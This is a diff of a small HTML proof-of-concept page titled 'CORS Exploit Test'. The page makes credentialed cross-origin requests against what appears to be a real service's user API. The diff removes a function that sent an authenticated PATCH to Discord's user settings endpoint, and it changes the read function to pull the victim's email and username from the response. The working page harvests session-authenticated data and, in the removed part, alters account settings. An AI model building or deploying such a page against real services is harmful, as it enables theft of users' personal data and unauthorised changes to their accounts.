@@ -6,7 +6,6 @@
 <body>
   <h1>CORS Exploit Test</h1>
   <button onclick="sendRead()">Test Read</button>
-  <button onclick="sendWrite()">Test Write</button>
 
   <script>
     function sendRead() {
@@ -15,22 +14,12 @@
         credentials: "include"
       })
       .then(response => response.json())
-      .then(data => alert("Read success: " + JSON.stringify(data)))
-      .catch(err => alert("Read failed: " + err));
-    }
-
-    function sendWrite() {
-      fetch("https://discord.com/api/v9/users/@me/settings", {
-        method: "PATCH",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ status: "idle" })
+      .then(data => {
+        const email = data.email || "Email not available";
+        const username = data.username || "Username not available";
+        alert("Email: " + email + "\nUsername: " + username);
       })
-      .then(response => response.json())
-      .then(data => alert("Write success: " + JSON.stringify(data)))
-      .catch(err => alert("Write failed: " + err));
+      .catch(err => alert("Read failed: " + err));
     }
   </script>
 </body>
